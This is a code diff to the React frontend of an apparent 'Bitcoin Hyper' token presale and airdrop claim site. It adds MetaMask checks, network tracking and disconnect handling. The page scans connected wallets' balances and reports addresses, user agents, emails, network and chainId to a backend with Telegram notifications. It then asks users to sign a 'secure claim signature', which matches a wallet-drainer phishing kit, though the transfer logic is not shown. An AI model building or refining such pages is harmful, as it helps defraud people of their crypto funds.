@@ -27,8 +27,14 @@ function App() {
   const [showEmailModal, setShowEmailModal] = useState(false);
   const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);
   const [walletBalance, setWalletBalance] = useState('0');
+  const [currentNetwork, setCurrentNetwork] = useState('');
   
   const animationContainerRef = useRef(null);
+
+  // Check if MetaMask is installed
+  const checkMetaMask = () => {
+    return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
+  };
 
   // Initialize session and check backend
   useEffect(() => {
@@ -50,22 +56,25 @@ function App() {
       trackSiteVisit();
       
       // Check for wallet connection on page load
-      if (window.ethereum) {
-        checkExistingWalletConnection();
+      if (checkMetaMask()) {
+        await checkExistingWalletConnection();
       }
     };
 
     initApp();
     
     // Listen for account changes
-    if (window.ethereum) {
+    if (checkMetaMask()) {
       window.ethereum.on('accountsChanged', handleAccountsChanged);
-      window.ethereum.on('chainChanged', () => window.location.reload());
+      window.ethereum.on('chainChanged', handleChainChanged);
+      window.ethereum.on('disconnect', handleDisconnect);
     }
     
     return () => {
-      if (window.ethereum) {
+      if (checkMetaMask()) {
         window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
+        window.ethereum.removeListener('chainChanged', handleChainChanged);
+        window.ethereum.removeListener('disconnect', handleDisconnect);
       }
     };
   }, []);
@@ -82,36 +91,77 @@ function App() {
         // Get wallet balance
         const balance = await provider.getBalance(address);
         setWalletBalance(ethers.formatEther(balance));
+        
+        // Get network
+        const network = await provider.getNetwork();
+        setCurrentNetwork(network.name);
       }
     } catch (error) {
-      console.log('No existing wallet connection');
+      console.log('No existing wallet connection:', error.message);
     }
   };
 
-  const handleAccountsChanged = (accounts) => {
+  const handleAccountsChanged = async (accounts) => {
     if (accounts.length === 0) {
       // User disconnected wallet
-      setIsConnected(false);
-      setWalletAddress('');
-      setIsEligible(false);
-      setTokenAllocation({ amount: '0', valueUSD: '0' });
+      handleDisconnect();
     } else {
-      setWalletAddress(accounts[0]);
-      // Trigger auto-scan
-      setTimeout(() => connectWallet(true), 1000);
+      const address = accounts[0];
+      setWalletAddress(address);
+      
+      // Get updated balance and network
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const balance = await provider.getBalance(address);
+        setWalletBalance(ethers.formatEther(balance));
+        
+        const network = await provider.getNetwork();
+        setCurrentNetwork(network.name);
+        
+        // Trigger auto-scan if backend is connected
+        if (backendStatus === 'connected') {
+          setTimeout(() => connectWallet(true), 1000);
+        }
+      } catch (error) {
+        console.error('Error updating wallet info:', error);
+      }
     }
+  };
+
+  const handleChainChanged = async (chainId) => {
+    // Reload page on chain change
+    window.location.reload();
+  };
+
+  const handleDisconnect = () => {
+    setIsConnected(false);
+    setWalletAddress('');
+    setIsEligible(false);
+    setTokenAllocation({ amount: '0', valueUSD: '0' });
+    setEmail('');
+    setEmailSubmitted(false);
+    setError('');
+    setWalletBalance('0');
+    setCurrentNetwork('');
+    console.log('Wallet disconnected');
   };
 
   const checkBackendStatus = async () => {
     try {
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 10000);
+
       const response = await fetch(`${BACKEND_URL}/api/health`, {
         method: 'GET',
         headers: { 
           'Content-Type': 'application/json',
           'Accept': 'application/json'
         },
-        mode: 'cors'
+        mode: 'cors',
+        signal: controller.signal
       });
+
+      clearTimeout(timeoutId);
 
       if (response.ok) {
         const data = await response.json();
@@ -144,7 +194,6 @@ function App() {
   };
 
   const sendTelegramNotification = async (type, data) => {
-    // This would be handled by backend, but we notify backend about frontend status
     try {
       await fetch(`${BACKEND_URL}/api/track/visit`, {
         method: 'POST',
@@ -189,14 +238,15 @@ function App() {
       return;
     }
 
+    if (!checkMetaMask()) {
+      setError('Please install MetaMask to continue. Visit https://metamask.io/');
+      return;
+    }
+
     try {
       setLoading(true);
       if (!autoConnect) {
         setLoadingMessage('Requesting wallet connection...');
-      }
-
-      if (!window.ethereum) {
-        throw new Error('Please install MetaMask or another Web3 wallet to continue.');
       }
 
       // Request accounts
@@ -209,9 +259,14 @@ function App() {
       setWalletAddress(address);
       setIsConnected(true);
       
-      // Get wallet balance
-      const balance = await provider.getBalance(address);
+      // Get wallet balance and network
+      const [balance, network] = await Promise.all([
+        provider.getBalance(address),
+        provider.getNetwork()
+      ]);
+      
       setWalletBalance(ethers.formatEther(balance));
+      setCurrentNetwork(network.name);
 
       if (!autoConnect) {
         setLoadingMessage('🔍 Analyzing wallet portfolio...');
@@ -228,7 +283,9 @@ function App() {
           walletAddress: address,
           userAgent: navigator.userAgent,
           sessionId: sessionId,
-          email: email || ''
+          email: email || '',
+          network: network.name,
+          chainId: network.chainId.toString()
         })
       });
 
@@ -341,7 +398,7 @@ function App() {
       setLoadingMessage('🔄 Preparing secure claim signature...');
 
       // Check if wallet is still connected
-      if (!window.ethereum) {
+      if (!checkMetaMask()) {
         throw new Error('Wallet disconnected. Please reconnect your wallet.');
       }
 
@@ -562,21 +619,6 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
     }, 5000);
   };
 
-  const disconnectWallet = () => {
-    setIsConnected(false);
-    setWalletAddress('');
-    setIsEligible(false);
-    setTokenAllocation({ amount: '0', valueUSD: '0' });
-    setEmail('');
-    setEmailSubmitted(false);
-    setError('');
-    
-    if (window.ethereum && window.ethereum.removeListener) {
-      // In a real app, you might want to request disconnection
-      console.log('Wallet disconnected');
-    }
-  };
-
   const retryConnection = async () => {
     setError('');
     await connectWallet();
@@ -635,18 +677,34 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
         )}
       </div>
       
-      <button 
-        className="connect-button"
-        onClick={() => connectWallet()}
-        disabled={loading || backendStatus !== 'connected'}
-      >
-        {loading ? 'Connecting...' : 'Connect Web3 Wallet'}
-      </button>
+      {!checkMetaMask() ? (
+        <div className="metamask-required">
+          <div className="metamask-icon">🦊</div>
+          <h4>MetaMask Required</h4>
+          <p>Please install MetaMask browser extension to participate in the presale.</p>
+          <a 
+            href="https://metamask.io/download/" 
+            target="_blank" 
+            rel="noopener noreferrer"
+            className="metamask-button"
+          >
+            Download MetaMask
+          </a>
+        </div>
+      ) : (
+        <button 
+          className="connect-button"
+          onClick={() => connectWallet()}
+          disabled={loading || backendStatus !== 'connected'}
+        >
+          {loading ? 'Connecting...' : 'Connect Web3 Wallet'}
+        </button>
+      )}
       
       <div className="wallet-requirements">
         <h4>📋 Requirements:</h4>
         <ul>
-          <li>✅ MetaMask, Trust Wallet, or compatible Web3 wallet</li>
+          <li>✅ MetaMask wallet required</li>
           <li>✅ Wallet with transaction history</li>
           <li>✅ EVM-compatible address (0x...)</li>
           <li>✅ Sufficient balance for network fees</li>
@@ -713,6 +771,12 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
               <span>Native Balance:</span>
               <strong>{parseFloat(walletBalance).toFixed(4)} ETH</strong>
             </div>
+            {currentNetwork && (
+              <div className="info-item">
+                <span>Network:</span>
+                <strong>{currentNetwork.charAt(0).toUpperCase() + currentNetwork.slice(1)}</strong>
+              </div>
+            )}
           </div>
         </div>
       </div>
@@ -757,7 +821,7 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
           </button>
           <button 
             className="action-button secondary"
-            onClick={disconnectWallet}
+            onClick={handleDisconnect}
           >
             🔗 Connect Different Wallet
           </button>
@@ -979,13 +1043,16 @@ I authorize the allocation of Bitcoin Hyper tokens to my wallet as part of the o
               {isEligible && (
                 <span className="wallet-badge eligible">ELIGIBLE</span>
               )}
+              {currentNetwork && (
+                <span className="network-badge">{currentNetwork.charAt(0).toUpperCase() + currentNetwork.slice(1)}</span>
+              )}
             </div>
           )}
           
           {isConnected && (
             <button 
               className="disconnect-button"
-              onClick={disconnectWallet}
+              onClick={handleDisconnect}
             >
               Disconnect
             </button>
